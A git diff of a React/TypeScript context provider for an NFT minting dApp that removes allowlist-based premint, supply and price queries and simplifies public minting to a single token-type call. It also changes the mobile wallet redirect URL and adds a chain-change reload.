@@ -5,14 +5,11 @@
 /* eslint-disable no-unused-vars */
 /* eslint-disable no-console */
 /* eslint-disable react/jsx-no-constructed-context-values */
-import { BigNumber, ethers, providers } from 'ethers';
+import { ethers } from 'ethers';
 import React, { createContext, useCallback, useEffect, useState } from 'react';
-import keccak256 from 'keccak256';
-import { MerkleTree } from 'merkletreejs';
-import contractAbi from './contractAbi.json';
-import allowlist from './allowList.json';
 import useInterval from '../useInterval';
 import isDebug from '../utils/debug';
+import contractAbi from './contractAbi.json';
 
 // eslint-disable-next-line no-shadow
 export const enum ContractStatus {
@@ -23,19 +20,14 @@ export const enum ContractStatus {
 }
 
 interface ContextInterface {
-  canPremint: boolean;
   connectWallet: () => void;
   contractStatus: ContractStatus;
   currentAccount: `0x${string}` | undefined;
   errorMessage: string | undefined;
-  getCanPremint: () => void;
-  maxSupply: number;
-  mintPublic: (quantity: 1 | 2) => Promise<false | ethers.ContractReceipt>;
-  premint: (quantity: 1 | 2) => Promise<false | ethers.ContractReceipt>;
-  setErrorMessage: React.Dispatch<React.SetStateAction<string>>;
+  mintPublic: (tokenType: number) => Promise<false | ethers.ContractReceipt>;
+  setErrorMessage: React.Dispatch<React.SetStateAction<string | undefined>>;
   setSwitchNetwork: React.Dispatch<React.SetStateAction<boolean>>;
   switchNetwork: boolean;
-  totalSupply: number;
   transactionHash?: string;
   transactionResult?: ethers.ContractReceipt;
 }
@@ -52,16 +44,21 @@ const ContractContextProvider = ({
   children: React.ReactNode
 }) => {
   const [currentAccount, setCurrentAccount] = useState<`0x${string}`>();
-  const [errorMessage, setErrorMessage] = useState('');
-  const [canPremint, setCanPremint] = useState(false);
+  const [errorMessage, setErrorMessage] = useState<string>();
   const [contractStatus, setContractStatus] = useState<ContractStatus>(0);
   const [transactionHash, setTransactionHash] = useState<string>();
   const [transactionResult, setTransactionResult] = useState<ethers.ContractReceipt>();
   const [switchNetwork, setSwitchNetwork] = useState(false);
-  const [totalSupply, setTotalSupply] = useState(0);
-  const [maxSupply, setMaxSupply] = useState(1000);
   const [chainId, setChainId] = useState<number>();
-  const [price, setPrice] = useState<BigNumber>(BigNumber.from('200000000000000000'));
+
+  useEffect(() => {
+    if (window && window.ethereum) {
+
+      window.ethereum.on("chainChanged", () => {
+        window.location.reload();
+      })
+    }
+  })
 
   function handleError(error: unknown) {
     let message = 'Unknown Error';
@@ -105,7 +102,7 @@ const ContractContextProvider = ({
     try {
       if (!ethereum) {
         if (window.innerWidth < 800) {
-          window.location.replace('https://metamask.app.link/dapp/danataylor.io/mint');
+          window.location.replace('https://noun266.xys');
         }
       }
 
@@ -180,117 +177,8 @@ const ContractContextProvider = ({
     }
   };
 
-  const getCanPremint = async () => {
-    const { ethereum } = window;
 
-    try {
-      if (!ethereum) {
-        // eslint-disable-next-line no-alert
-        alert('Please install MetaMask or another wallet provider.');
-        return false;
-      }
-      if (currentAccount) {
-        const contract = getContract();
-        const leaves = allowlist.map((obj: { 'Wallet': string }) => keccak256(obj.Wallet));
-        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
-        const hexProof = merkleTree.getHexProof(keccak256(currentAccount || ''));
-        const canPremintRes = await contract.canPremint(
-          currentAccount,
-          hexProof,
-        );
-
-        setCanPremint(canPremintRes);
-
-        return canPremintRes;
-      }
-
-      return false;
-    } catch (error) {
-      console.error('getCanPremint');
-      handleError(error);
-      return false;
-    }
-  };
-
-  const getTotalSupply = async () => {
-    const { ethereum } = window;
-
-    try {
-      if (!ethereum) {
-        // eslint-disable-next-line no-alert
-        alert('Please install MetaMask or another wallet provider.');
-        return false;
-      }
-      if (currentAccount) {
-        const contract = getContract();
-
-        const totalSupplyRes = await contract.totalSupply();
-        setTotalSupply(totalSupplyRes);
-
-        return totalSupplyRes;
-      }
-
-      return false;
-    } catch (error) {
-      console.error('getTotalSupply');
-      handleError(error);
-      return false;
-    }
-  };
-
-  const getMaxSupply = async () => {
-    const { ethereum } = window;
-
-    try {
-      if (!ethereum) {
-        // eslint-disable-next-line no-alert
-        alert('Please install MetaMask or another wallet provider.');
-        return false;
-      }
-      if (currentAccount) {
-        const contract = getContract();
-
-        const maxSupplyRes = await contract._maxSupply();
-        setMaxSupply(maxSupplyRes);
-
-        return maxSupplyRes;
-      }
-
-      return false;
-    } catch (error) {
-      console.error('getMaxSupply');
-      handleError(error);
-      return false;
-    }
-  };
-
-  const getPrice = async () => {
-    const { ethereum } = window;
-
-    try {
-      if (!ethereum) {
-        // eslint-disable-next-line no-alert
-        alert('Please install MetaMask or another wallet provider.');
-        return false;
-      }
-      if (currentAccount) {
-        const contract = getContract();
-
-        const priceRes = await contract._price();
-        setPrice(priceRes);
-
-        return priceRes;
-      }
-
-      return false;
-    } catch (error) {
-      console.error('getPrice');
-      handleError(error);
-      return false;
-    }
-  };
-
-  const premint = async (quantity: 1 | 2) => {
+  const mintPublic = async (tokenTypeIndex: number) => {
     const { ethereum } = window;
     setTransactionHash(undefined);
     setTransactionResult(undefined);
@@ -304,63 +192,17 @@ const ContractContextProvider = ({
 
       if (currentAccount) {
         const contract = getContract();
-        const leaves = allowlist.map((obj: { 'Wallet': string }) => keccak256(obj.Wallet));
-        const merkleTree = new MerkleTree(leaves, keccak256, { sortPairs: true });
-        const hexProof = merkleTree.getHexProof(keccak256(currentAccount || ''));
-        const privateMint: ethers.ContractTransaction = await contract.premint(
-          quantity,
-          hexProof,
-          {
-            value: price.mul(quantity),
-          },
-        );
-
-        setTransactionHash(privateMint.hash);
-        const privateMinted = await privateMint.wait(2);
-        await getTotalSupply();
-        setTransactionResult(privateMinted);
-        return privateMinted;
-      }
-
-      return false;
-    } catch (error) {
-      console.error('mintPrivate');
-      handleError(error);
-      return false;
-    }
-  };
-
-  const mintPublic = async (quantity: 1 | 2) => {
-    const { ethereum } = window;
-    setTransactionHash(undefined);
-    setTransactionResult(undefined);
-
-    try {
-      if (!ethereum) {
-        // eslint-disable-next-line no-alert
-        alert('Please install MetaMask or another wallet provider.');
-        return false;
-      }
-
-      if (currentAccount) {
-        const contract = getContract();
-        const publicMint: ethers.ContractTransaction = await contract.mint(
-          quantity,
-          {
-            value: price.mul(quantity),
-          },
-        );
+        const publicMint: ethers.ContractTransaction = await contract.mintPublic(tokenTypeIndex);
 
         setTransactionHash(publicMint.hash);
         const publicMinted = await publicMint.wait(2);
-        await getTotalSupply();
         setTransactionResult(publicMinted);
         return publicMinted;
       }
 
       return false;
     } catch (error) {
-      console.error('mintPrivate');
+      console.error('mintPublic');
       handleError(error);
       return false;
     }
@@ -372,34 +214,25 @@ const ContractContextProvider = ({
     checkIfWalletIsConnected();
     if (currentAccount) {
       getContractStatus();
-      getCanPremint();
-      getPrice();
     }
-  }, [checkIfWalletIsConnected, currentAccount, getCanPremint, getContractStatus, getPrice, switchNetwork]);
+  }, [checkIfWalletIsConnected, currentAccount, getContractStatus, switchNetwork]);
 
   useInterval(() => {
     if (currentAccount && !switchNetwork) {
-      getTotalSupply();
-      getMaxSupply();
       getContractStatus();
     }
   }, 5000);
 
   return (
     <ContractContext.Provider value={{
-      canPremint,
       connectWallet,
       contractStatus,
       currentAccount,
       errorMessage,
-      getCanPremint,
-      maxSupply,
       mintPublic,
-      premint,
       setErrorMessage,
       setSwitchNetwork,
       switchNetwork,
-      totalSupply,
       transactionHash,
       transactionResult,
     }}
